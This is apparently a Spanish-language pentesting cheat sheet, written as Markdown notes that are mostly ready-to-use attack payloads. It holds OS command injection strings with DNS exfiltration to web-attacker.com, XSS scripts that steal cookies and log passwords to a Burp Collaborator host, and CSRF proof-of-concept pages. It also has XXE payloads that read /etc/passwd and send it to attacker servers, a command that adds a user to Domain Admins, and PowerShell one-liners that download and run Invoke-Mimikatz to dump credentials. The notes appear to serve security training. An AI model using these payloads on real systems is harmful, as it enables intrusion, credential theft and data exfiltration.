loggin_error() {
	echo "error in: $1" >> error.log
}

for delay in 1 5 10; do
	echo $delay
	delayed_curl "www.asjdlfjsdf.com" loggin_error $delay &
	delayed_curl "https://webhook.site/0cd769e1-20ce-4b42-aa10-2e580fef6a26" loggin_error $delay &
done
~~~

## En una sola línea
~~~bash
time sleep 5 && curl -s "https://webhook.site/0cd769e1-20ce-4b42-aa10-2e580fef6a26" && echo "Ready! `date`" & echo "Comenzando (se imprime primero) `date`" 

# Output:
    # [1] 1156018
    # Comenzando (se imprime primero) jue 29 jun 2023 09:11:35 CST
    # real	0m5.002s
    # user	0m0.002s
    # sys	0m0.000s
    # Ready! jue 29 jun 2023 09:11:41 CST
~~~

************************************************************************************************
# Utilerías

## Imprimir todo lo que no es comentario
~~~bash
awk '!/#/' file
~~~
Referencias:
+ https://www.unixtutorial.org/awk-delimiter/

## Remover caracteres repetidos
~~~bash
tr -s 'character'
tr -s ' '
tr -s '\n'

~~~ 
## Borrar un caracter de un string
~~~bash
tr -d ".|,"
~~~

## Reemplazar una cadena por nada 
~~~bash
sed "s/|a|//g" 
sed "s/|a|/~b~/g" 
~~~

## Remover la última letra del string
~~~bash
sed 's/.$//'
~~~

## Descargar un archivo con scp
~~~bash
scp user@192.168.100.100:path/file.txt /local/dir
~~~

## Subir un archivo con scp
~~~bash
scp file user@192.168.100.100:path/file.txt
~~~

## Con llave publica
~~~bash
scp -i key_file.pem user@192.168.100.100:path/file.txt /local/dir
~~~

## Control con systemctl
~~~bash
# Systemctl
sudo systemctl status ssh
sudo systemctl start ssh
sudo systemctl stop ssh
sudo systemctl restart ssh

# Preguntar si está activo
sudo systemctl is-active apache

# Preguntar si está habilitado
sudo systemctl is-enable apache
~~~

************************************************************************************************
# Web

## Command Injection

### OS command injection, simple case
~~~bash
# Special characters 
&
&&
;
||
|
~~~
Example
~~~bash
productId=1&storeId=1%26sleep+5
~~~
+ %26 = %

## Comandos útiles Linux
~~~bash
whoami
uname -a
ifconfig
netstat -an
ps -ef	
~~~

## Time delays
~~~bash
& ping -c 10 127.0.0.1 &
~~~

## Exploiting blind OS command injection by redirecting output
~~~bash
& whoami > /var/www/static/whoami.txt &
# https://vulnerable-website.com/whoami.txt
~~~

## Blind OS command injection with out-of-band data exfiltration
~~~bash
& nslookup `whoami`.web-attacker.com &
& nslookup $(whoami).web-attacker.com &
~~~

## Comandos útiles Windows
~~~cmd
whoami
ver
ipconfig /all
netstat -an
tasklist
~~~

## Tipos de ofuscación

### URL encode
+ % character and their 2-digit hex (`%26`) (&)
+ Cyberchef (*URL Decode*) (*URL Encode*)

### HTML encoding
+ prefixed with an ampersand and terminated with a semicolon. In many cases, a name can be used for the reference. For example, the sequence `&colon;` represents a colon character.
+ Alternatively, the reference may be provided using the character's **decimal** or **hex code** point, in this case, `&#58;` (:) and `&#x3a;` (:)respectively.
+ when using decimal or hex-style HTML encoding, you can optionally include an arbitrary number of leading zeros in the code points. Some WAFs and other input filters fail to adequately account for this.
    + `<a href="javascript&#58;alert(1)">Click me</a>`
    + `<a href="javascript&#00058;alert(1)">Click me</a>`
    + `<a href="javascript&#00000000000000000000058;alert(1)">Click me</a>`
+ Cyberchef
    + Decimal: (*From decimal*) (*To decimal*)
    + Hex code: (*to hex*) (*from hex*)
    + HTML encoding: (*From HTML Entity*) (*Ti HTML Entity*)

### XML Encode
+ This enables you to include special characters in the text content of elements without breaking the syntax, which can come in handy when testing for XSS via XML-based input, for example.
    + `&#x53;ELECT`

### Unicode escaping
+ Unicode escape sequences consist of the prefix \u followed by the four-digit hex code for the character. For example, `\u003a` represents a colon.
    + ES6 also supports a new form of unicode escape using curly braces: `\u{3a}`.
        + `eval("\u0061lert(1)")`
    + Inside a string, you can escape any characters like this. However, outside of a string, escaping some characters will result in a syntax error. This includes opening and closing parentheses
+ Cyberchef
    + Unescape Unicode Characters
    + Escape Unicode Characters (select encode all characters)

### hex escaping
+ Another option when injecting into a string context is to use hex escapes, which represent characters using their hexadecimal code point, prefixed with \x.
+ Cyberchef
    + From hex
    + To hex

### Obfuscation via octal escaping
+ Octal escaping works in pretty much the same way as hex escaping, except that the character references use a base-8 numbering system rather than base-16.
+ Cyberchef
    + From octal
    + To octal

### Obfuscation via multiple encodings
+ view "Más información" item

### Obfuscation via SQL CHAR() function
+ view "Más información" item

### Otras herramientas 
+ Hackvector (Plugin Burp Suite)
    + Select > Click drecho > Extensions > Hackvector > encode > hex_entities

### Más información
+ https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-hex-escaping

## Headers web
### Evasión de bloqueos en Login Web
#### Vía X-Forwarded-For

Sustituir en las cabeceras de la petición
~~~bash
X-Forwarded-For: 2001:db8:85a3:8d3:1319:8a2e:370:7348

X-Forwarded-For: 203.0.113.195

X-Forwarded-For: 203.0.113.195, 70.41.3.18, 150.172.238.178

X-Forwarded-For: 127.0.0.1
~~~


Más información:
+ https://developer.mozilla.org/es/docs/Web/HTTP/Headers/X-Forwarded-For

### reset poisoning via middleware
#### X-Forwarded-Host

Sustituir en las cabeceras de la petición
~~~bash
X-Forwarded-Host: id42.example-cdn.com
~~~

Más información:
+ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host


## Exfiltrar información

~~~html
<script>
    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
        method: 'POST',
        mode: 'no-cors',
        body:document.cookie
    });
</script>
~~~

## Keylogger en input
~~~html
<script>
    document.getElementsByName("password")[0].addEventListener('change',function(){
        console.log(this.value);
        the_username = document.getElementsByName("username")[0].value
        the_password = this.value;

        fetch('https://subdomain.burpcollaborator.net', {
            method: 'POST',
            mode: 'no-cors',
            body:the_username+"~"+the_password
        });
    });
</script>
~~~

## Nuevo login
~~~html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
~~~

## Cambio de contraseña inseguro
~~~html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
~~~

## Ejemplo CRSF en POST
~~~html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://000.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="new2&#64;email&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

~~~

## Ejemplo CRSF en GET
~~~html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
<!--  <script>history.pushState('', '', '/')</script>-->
    <form action="https://000.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="new222&#64;email&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

~~~

## Ejemplo CSRF
~~~html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
    document.forms[0].submit();
</script>
~~~

## Ejemplo CSRF sin parametro CSRF
~~~html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://000.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="new1234&#64;email&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

~~~

## XSS

+ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

## XSS Reflejado

~~~html
<iframe src="https://000.web-security-academy.net/?search=%3Cbody+onresize=print(1)%3E" width="1px" onload=this.style.width='0px'></iframe>
~~~


~~~html
<script>
location = "https://000.web-security-academy.net/?search=%3Cvideo2+id=x+onfocus=alert(document.cookie)+tabindex=1%3E#x";
</script>
~~~

~~~html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me1</text></a>
~~~

### A partir del tag de value en un input
~~~html
"onmouseover="alert(1)
~~~

### A partir de corromper el href
~~~html
<a id="author" href="javascript:this.addEventListener(&quot;click&quot;, alert(1))">text</a>
<a id="author" href="javascript:alert(2)">text</a>
~~~

### A partir de Access Key
~~~html
Visitando:
/?'accesskey='x'onclick='alert(1)
/?'accesskey='x'onclick='alert(1)'

Referencias
<button accesskey="s">Stress reliever</button>
<link rel="canonical" accesskey="X" onclick="alert(1)" />
<link rel="alternate" accesskey="y" onclick="alert(2)" />
https://url.com/?'accesskey='x'onclick='alert(1)
~~~

### Interpretación matemática
~~~html
Funciona porque javascript lo interpreta como una ecuación matemática: 

# Multiplicación
https://000.web-security-academy.net/?search=%27*alert(1)*%27

# Resta
https://000.web-security-academy.net/?search=%27*alert(1)*%27
~~~

### Escapar terminadores
~~~javascript
https://000.web-security-academy.net/?search=\%27-alert(1);//+comentario
\'-alert(1);//+comentario

var searchTerms = '\\'-alert(1);// comentario';
~~~

### Sustituyendo windows para lanzar un error
~~~javascript

5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
~~~
Referencia:
+ https://stackoverflow.com/questions/64416874/javascript-window-object-window-what-does-this-code-do

### XXE

#### Validate if XXE exists in app
~~~xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE check [ <!ENTITY xxe "exist"> ]> 
<stockCheck><productId>&xxe;</productId></stockCheck>
~~~

#### Exploiting XXE to retrieve files
~~~xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
~~~

#### Exploiting XXE to perform SSRF attacks
~~~xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
~~~

#### Blind XXE vulnerabilities
##### Detecting blind XXE using out-of-band (OAST) techniques
~~~xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
~~~

##### With params
+ First, the declaration of an XML parameter entity includes the percent character before the entity name:
+ And second, parameter entities are referenced using the percent character instead of the usual ampersand:

~~~xml
<!-- <!ENTITY % myparameterentity "my parameter entity value" > -->
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
~~~ 
+ Observa la declaración de la variable con `% variable`
+ El uso de la variable con `%variable;` dentro de los corchetes

#### Exploiting blind XXE to exfiltrate data out-of-band
~~~xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
~~~

~~~xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
~~~
+ This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the /etc/passwd file is transmitted to the attacker's server.
+ This technique might not work with some file contents, including the newline characters contained in the /etc/passwd file. This is because some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL. In this situation, it might be possible to use the FTP protocol instead of HTTP. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as /etc/hostname can be targeted instead.

##### Example:
In the server 
~~~xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % data "<!ENTITY &#x25; exfil SYSTEM 'http://url.com/?data1=%file;'>">
%data;
%exfil;
~~~

In the Burp petition 
~~~xml
<!DOCTYPE checker
[
<!ENTITY % xxe SYSTEM "http://exploit-server.net/exploit">
%xxe;
]
>
~~~

##### Example with errors:
~~~xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % data "<!ENTITY &#x25; error SYSTEM 'file:///etc/%file;'>">
%data;
%error;
~~~

In the Burp petition 
~~~xml
<!DOCTYPE checker
[
<!ENTITY % xxe SYSTEM "http://exploit-server.net">
%xxe;
]
>
~~~

#### Exploiting blind XXE to retrieve data via error messages
##### Example
In the server:
~~~xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % data "<!ENTITY &#x25; exfil SYSTEM 'file:///%file;'>">
%data;
%exfil;
~~~

In the burpsuite petition
~~~xml
<!DOCTYPE checker
[
<!ENTITY % xxe SYSTEM "https://exploit-server.net/exploit">
%xxe;
] 
>
~~~

#### Exploiting XXE to retrieve data by repurposing a local DTD
Use percent symbol because this give you more information(?)

##### Payloads and dictionaries
+ https://github.com/GoSecure/dtd-finder/tree/master
+ https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md

#### Exploiting XInclude to retrieve files
First step, checking if the entities are allowed
~~~xml
%26entity;
~~~
+ Result:
    + "Entities are not allowed for security reasons" or ANOTHER

Attack
~~~xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
~~~

##### Example
~~~bash
# Normal petition
productId=1&storeId=1

# Checking for entities attack
productId=%26xxe;&storeId=1

# Retrive data 
productId=<xinclude xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></xinclude>&storeId=1
~~~

#### XXE attacks via file upload
~~~xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
~~~

#### XXE attacks via modified content type


#### Más información
+ https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files
+ https://www.w3schools.com/xml/xml_dtd.asp 
+ https://github.com/streaak/keyhacks
+ https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
+ Extension: Content-Type-Converter



************************************************************************************************
# WiFi
## Escanear redes
~~~bash
# Ecacenar interfaz
# iwlist <interfaz> scan | grep SSID
iwlist wlan0 scan | grep SSID
    # ESSID:"Red 1"
    # ESSID:"Red 2"
~~~


************************************************************************************************
# Windows
## Descargar archivos

**Requiere administrador**
~~~powershell
# Metodo 1 - Download in PowerShell 2 ^
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://raw.githubusercontent.com/elcaza/pentest/main/README.md","C:\path\file")

# Metodo 2 - Download with Invoke-WebRequest ^
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/elcaza/pentest/main/README.md" -OutFile "C:\path\file"

# Metodo 3 - Download with Invoke-WebRequest ^
wget "https://raw.githubusercontent.com/elcaza/pentest/main/README.md" -outfile "file"
~~~

Más información:
+ https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/

## Añadir usuario a Dominio
~~~ powershell
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN
~~~ 

## Ejecutando un living off the land
+ Windows Defender lo detecta como actividad maliciosa

~~~powershell
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
~~~

iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JJ8R4'))

Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.100.59:3000/poc.ps1')


Más información
+ https://lolbas-project.github.io/
+ https://github.com/LOLBAS-Project/LOLBAS
+ https://www.elladodelmal.com/2020/09/windows-amsi-antimalware-scan-interface.html
+ https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-network-connections-microsoft-defender-antivirus?view=o365-worldwide
+ https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-exclusions?view=o365-worldwide
+ https://www.gb-advisors.com/es/mimikatz/#:~:text=Windows%20cuenta%20con%20la%20funcionalidad,la%20clave%20secreta%20para%20descifrarlas.

## Obteniendo datos del sistema

~~~cmd
REM REM = Comentario en CMD
REM Obtener información
systeminfo 
~~~